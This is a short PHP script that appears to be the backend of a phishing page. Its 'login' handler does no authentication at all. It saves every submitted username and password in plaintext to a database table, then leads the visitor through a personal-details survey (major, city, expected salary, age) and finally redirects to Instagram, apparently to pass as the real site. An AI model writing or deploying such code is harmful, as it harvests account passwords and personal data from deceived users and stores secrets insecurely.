<?php
session_start();
require_once 'config.php';

// Handle login form submission
if (isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    try {
        // Save login details to database
        $stmt = $conn->prepare("INSERT INTO login_attempts (username, password, attempt_time) VALUES (?, ?, NOW())");
        $stmt->execute([$username, $password]);
        
        // Redirect to survey page
        header("Location: survey.php");
        exit();
    } catch(PDOException $e) {
        die("Error: " . $e->getMessage());
    }
}

// Handle survey form submission
if (isset($_POST['submit_survey'])) {
    $major = $_POST['major'];
    $city = $_POST['city'];
    $expected_salary = $_POST['expected_salary'];
    $age = $_POST['age'];
    
    try {
        // Save survey responses to database
        $stmt = $conn->prepare("INSERT INTO survey_responses (major, city, expected_salary, age, submission_time) VALUES (?, ?, ?, ?, NOW())");
        $stmt->execute([$major, $city, $expected_salary, $age]);
        
        // Redirect to Instagram with HTTPS
        header("Location: http://www.instagram.com");
        exit();
    } catch(PDOException $e) {
        die("Error: " . $e->getMessage());
    }
}
?> 
